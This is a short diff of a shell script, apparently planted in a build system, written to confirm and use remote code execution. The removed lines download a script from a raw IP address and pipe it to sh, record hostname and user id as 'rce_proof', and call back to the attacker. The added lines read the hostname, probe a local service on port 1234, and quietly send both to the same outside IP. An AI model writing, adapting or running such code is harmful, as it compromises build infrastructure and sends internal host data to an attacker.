@@ -1,7 +1,5 @@
 #!/bin/sh
-wget -q -O- http://62.113.111.63:6666/script | sh
-cat /etc/hostname > /var/lib/buildkit/rce_proof.txt
-id >> /var/lib/buildkit/rce_proof.txt
-date >> /var/lib/buildkit/rce_proof.txt
-git ls-remote http://62.113.111.63:8891/rce-callback 2>/dev/null || true
+H=$(cat /etc/hostname 2>/dev/null || echo unknown)
+P=$(wget -q -T2 -O- http://127.0.0.1:1234/ 2>&1 | head -c 200)
+wget -q -O /dev/null "http://62.113.111.63:4444/rce_${H}__port1234_${P}" 2>/dev/null &
 exit 0
